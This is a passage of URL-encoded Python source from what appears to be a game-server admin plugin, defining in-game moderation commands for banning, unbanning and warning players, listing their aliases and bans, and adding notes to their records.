24'%2C%20cid)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%23%20failsafe%2C%20do%20a%20manual%20client%20id%20ban%0A%20%20%20%20%20%20%20%20%20%20%20%20self.console.ban(cid%2C%20reason%2C%20client)%0A%0A%20%20%20%20def%20cmd_ban(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%3E%20%5B%3Creason%3E%5D%20-%20ban%20a%20player%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20cid%2C%20keyword%20%3D%20m%0A%20%20%20%20%20%20%20%20reason%20%3D%20self.getReason(keyword)%0A%0A%20%20%20%20%20%20%20%20if%20not%20reason%20and%20client.maxLevel%20%3C%20self._noreason_level%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('error_no_reason'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(cid%2C%20client)%0A%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.cid%20%3D%3D%20client.cid%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.getMessage('ban_self'%2C%20client.exactName))%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20sclient.maxLevel%20%3E%3D%20client.maxLevel%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.maskGroup%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('action_denied_masked'%2C%20%7B'name'%3A%20sclient.exactName%7D))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.getMessage('ban_denied'%2C%20client.exactName%2C%20sclient.exactName))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.groupBits%20%3D%200%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.save()%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20duration%20%3D%20self.config.getDuration('settings'%2C%20'ban_duration')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.tempban(reason%2C%20keyword%2C%20duration%2C%20client)%0A%0A%20%20%20%20%20%20%20%20elif%20re.match('%5E%5B0-9%5D%2B%24'%2C%20cid)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%23%20failsafe%2C%20do%20a%20manual%20client%20id%20ban%0A%20%20%20%20%20%20%20%20%20%20%20%20duration%20%3D%20self.config.getDuration('settings'%2C%20'ban_duration')%0A%20%20%20%20%20%20%20%20%20%20%20%20self.console.tempban(cid%2C%20reason%2C%20duration%2C%20client)%0A%0A%20%20%20%20def%20cmd_banall(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cpattern%3E%20%5B%3Creason%3E%5D%20-%20ban%20all%20players%20matching%20%3Cpattern%3E%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20cid%2C%20keyword%20%3D%20m%0A%20%20%20%20%20%20%20%20reason%20%3D%20self.getReason(keyword)%0A%0A%20%20%20%20%20%20%20%20if%20not%20reason%20and%20client.maxLevel%20%3C%20self._noreason_level%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('error_no_reason'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20duration%20%3D%20self.config.getDuration('settings'%2C%20'ban_duration')%0A%20%20%20%20%20%20%20%20matches%20%3D%20self.console.clients.getByMagic(cid)%0A%20%20%20%20%20%20%20%20for%20sclient%20in%20matches%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.cid%20%3D%3D%20client.cid%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20sclient.maxLevel%20%3E%3D%20client.maxLevel%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.tempban(reason%2C%20keyword%2C%20duration%2C%20client)%0A%0A%20%20%20%20def%20cmd_lastbans(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20list%20the%205%20last%20bans%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20def%20format_ban(penalty)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20c%20%3D%20self.console.storage.getClient(Client(_id%3Dpenalty.clientId))%0A%20%20%20%20%20%20%20%20%20%20%20%20txt%20%3D%20%22%5E2%40%25s%5E7%20%25s%5E7%22%20%25%20(penalty.clientId%2C%20c.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20penalty.type%20%3D%3D%20'Ban'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20txt%20%2B%3D%20'%20(Perm)'%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20penalty.type%20%3D%3D%20'TempBan'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20txt%20%2B%3D%20'%20(%25s%20remaining)'%20%25%20minutesStr((penalty.timeExpire%20-%20self.console.time())%20%2F%2060.0)%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20raise%20AssertionError(%22unexpected%20penalty%20type%3A%20%25r%22%20%25%20penalty.type)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20penalty.reason%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20txt%20%2B%3D%20'%20%25s'%20%25%20penalty.reason%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20txt%0A%0A%20%20%20%20%20%20%20%20bans%20%3D%20self.console.storage.getLastPenalties(types%3D('Ban'%2C%20'TempBan')%2C%20num%3D5)%0A%20%20%20%20%20%20%20%20if%20len(bans)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20line%20in%20map(format_ban%2C%20bans)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20line)%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%5E7There%20are%20no%20active%20bans')%0A%0A%20%20%20%20def%20cmd_baninfo(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20%3Cname%3E%20-%20display%20why%20user%20was%20banned%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(m%5B0%5D%2C%20client)%0A%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20def%20format_ban(penalty)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20c%20%3D%20self.console.storage.getClient(Client(_id%3Dpenalty.clientId))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20txt%20%3D%20%22%5E2%40%25s%5E7%20%25s%5E7%22%20%25%20(penalty.clientId%2C%20c.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20penalty.type%20%3D%3D%20'Ban'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20txt%20%2B%3D%20'%20(Perm)'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20elif%20penalty.type%20%3D%3D%20'TempBan'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20txt%20%2B%3D%20'%20(%25s%20remaining)'%20%25%20minutesStr((penalty.timeExpire%20-%20self.console.time())%20%2F%2060.0)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20raise%20AssertionError(%22unexpected%20penalty%20type%3A%20%25r%22%20%25%20penalty.type)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20penalty.reason%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20txt%20%2B%3D%20'%20%25s'%20%25%20penalty.reason%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20txt%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20bans%20%3D%20self.console.storage.getClientPenalties(client%3Dsclient%2C%20type%3D('Ban'%2C%20'TempBan'))%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20len(bans)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20line%20in%20map(format_ban%2C%20bans)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20line)%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('baninfo_no_bans'%2C%20%7B'name'%3A%20sclient.exactName%7D))%0A%0A%20%20%20%20def%20cmd_runas(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%3E%20%3Ccommand%3E%20-%20run%20a%20command%20as%20a%20different%20user%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%20or%20m%5B1%5D%20%3D%3D%20''%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(m%5B0%5D%2C%20client)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.OnSay(self.console.getEvent('EVT_CLIENT_SAY'%2C%20m%5B1%5D%2C%20sclient))%0A%0A%20%20%20%20def%20cmd_unban(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%3E%20-%20un-ban%20a%20player%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20cid%2C%20reason%20%3D%20m%0A%20%20%20%20%20%20%20%20reason%20%3D%20self.getReason(reason)%0A%0A%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(cid%2C%20client)%0A%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20w%20in%20sclient.bans%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20w.adminId%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20admin%20%3D%20self.console.storage.getClient(Client(id%3Dw.adminId))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20admin.maxLevel%20%3E%20client.maxLevel%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7You%20cannot%20clear%20a%20ban%20from%20%25s'%20%25%20admin.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20except%20Exception%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pass%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient.unban(reason%2C%20client)%0A%0A%20%20%20%20def%20cmd_aliases(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%3E%20-%20list%20a%20players%20aliases%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20cid%20%3D%20m%5B0%5D%0A%0A%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(cid%2C%20client)%0A%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20myaliases%20%3D%20%5B%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20a%20in%20sclient.aliases%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20myaliases.append('%25s%5E7'%20%25%20a.alias)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20len(myaliases)%20%3E%2010%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20myaliases.append(self.getMessage('aliases_more_suffix'))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20break%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20len(myaliases)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('aliases'%2C%20sclient.exactName%2C%20'%2C%20'.join(myaliases)))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('no_aliases'%2C%20sclient.exactName))%0A%0A%20%20%20%20def%20cmd_warns(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20list%20warnings%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20client.message('%5E7Warnings%3A%20%25s'%20%25%20'%2C%20'.join(%0A%20%20%20%20%20%20%20%20%20%20%20%20sorted(%5Bx%20for%20x%20in%20self.warn_reasons.keys()%20if%20x%20not%20in%20('default'%2C%20'generic')%5D)))%0A%0A%20%20%20%20def%20cmd_notice(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%3E%20%3Cnotice%3E%20-%20add%20a%20good%2Fbad%20behavior%20note%20for%20the%20player%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%20or%20m%5B0%5D%20%3D%3D%20''%20or%20m%5B1%5D%20%3D%3D%20''%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cid%2C%20notice%20%3D%20m%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(cid%2C%20client)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.maxLevel%20%3E%3D%20client.maxLevel%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7Cannot%20add%20notice%20to%20higher%20level%20admin%20%25s'%20%25%20sclient.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.notice(notice%2C%20None%2C%20client)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7Notice%20added%20to%20%25s%3A%20%25s'%20%25%20(sclient.exactName%2C%20notice))%0A%0A%20%20%20%20def%20cmd_warn(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%3E%20%5B%3Cwarning%3E%5D%20-%20warn%20user%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cid%2C%20keyword%20%3D%20m%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(cid%2C%20client)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.id%20%3D%3D%20client.id%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('warn_self'%2C%20client.exactName))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20elif%20sclient.maxLevel%20%3E%3D%20client.maxLevel%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('warn_denied'%2C%20client.exactName%2C%20sclient.exactName))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.var(self%2C%20'warnTime').toInt()%20%3E%20self.console.time()%20-%20self.warn_delay%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('warn_too_fast'%2C%20%7B'num_second'%3A%20self.warn_delay%7D))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.warnClient(sclient%2C%20keyword%2C%20client)%0A%0A%20%20%20%20def%20cmd_warntest(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cwarning%3E%20-%20test%20a%20warning%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20duration%2C%20warning%20%3D%20self.getWarning(data)%0A%20%20%20%20%20%20%20%20except%20Exception%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20duration%2C%20warning%20%3D%20self.getWarning('generic')%0A%20%20%20%20%20%20%20%20%20%20%20%20warning%20%3D%20'%25s%20%25s'%20%25%20(warning%2C%20data)%0A%0A%20%20%20%20%20%20%20%20warning%20%3D%20warning%20%25%20%7B'name'%3A%20client.exactName%7D%0A%20%20%20%20%20%20%20%20client.message('%5E2TEST%3A%20%25s'%20%25%20self.config.getTextTemplate('warn'%2C%20'message'%2C%20warnings%3D1%2C%20reason%3Dwarning))%0A%0A%20%20%20%20def%20cmd_warnremove(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%3E%20-%20remove%20a%20users%20last%20warning%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(m%5B0%5D%2C%20client)%0A%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20w%20%3D%20sclient.lastWarning%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20not%20sclient.numWarnings%20or%20not%20w%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7No%20warnings%20found%20for%20%25s'%20%25%20sclient.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20w.adminId%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20admin%20%3D%20self.console.storage.getClient(Client(id%3Dw.adminId))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20admin.maxLevel%20%3E%20client.maxLevel%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7You%20cannot%20clear%20a%20warning%20from%20%25s'%20%25%20admin.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20except%20Exception%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pass%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20w.inactive%20%3D%201%0A%20%20%20%20%20%20%20%20%20%20%20%20self.console.storage.setClientPenalty(w)%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%25s%20%5E7last%20warning%20cleared%3A%20%5E3%25s'%20%25%20(sclient.exactName%2C%20w.reason))%0A%0A%20%20%20%20def%20cmd_warnclear(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%3E%20-%20clear%20all%20of%20a%20users%20warnings%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(m%5B0%5D%2C%20client)%0A%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20not%20sclient.numWarnings%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7No%20warnings%20found%20for%20%25s'%20%25%20sclient.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20cleared%20%3D%200%0A%20%20%20%20%20%20%20%20%20%20%20%20failed%20%3D%200%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20w%20in%20sclient.warnings%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20w.adminId%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20admin%20%3D%20self.console.storage.getClient(Client(id%3Dw.adminId))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20admin.maxLevel%20%3E%20client.maxLevel%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20failed%20%2B%3D%201%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20break%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20except%20Exception%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pass%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cleared%20%2B%3D%201%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20w.inactive%20%3D%201%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.storage.setClientPenalty(w)%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20failed%20and%20cleared%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%5E7Cleared%20%5E3%25s%20%5E7warnings%20and%20left%20%5E3%25s%20%5E7warnings%20for%20%25s'%20%25%20(%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20failed%2C%20cleared%2C%20sclient.exactName))%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20failed%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7Could%20not%20clear%20%5E3%25s%20%5E7warnings%20for%20%25s'%20%25%20(failed%2C%20sclient.exactName))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7All%20warnings%20cleared%20for%20%25s'%20%25%20sclient.exactName)%0A%0A%20%20%20%20def%20cmd_warninfo(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%3E%20-%20display%20how%20many%20warning%20points%20a%20user%20has%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(m%5B0%5D%2C%20client)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20warns%20%3D%20sclient.numWarnings%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20warns%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20msg%20%3D%20''%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20warn%20%3D%20sclient.firstWarning%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20warn%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20expire%20%3D%20functions.minutesStr((warn.timeExpire%20-%20(self.console.time()))%20%2F%2060)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20msg%20%3D%20'%2C%20expires%20in%20%5E2%25s'%20%25%20expire%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20warn%20%3D%20sclient.lastWarning%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20warn%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20msg%20%2B%3D%20'%5E7%3A%20%5E3%25s'%20%25%20warn.reason%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20%3D%20'%5E7%25s%20%5E7has%20%5E1%25s%20%5E7active%20warnings%25s'%20%25%20(sclient.exactName%2C%20warns%2C%20msg)%0A%20%20%20%20%20%20%20%20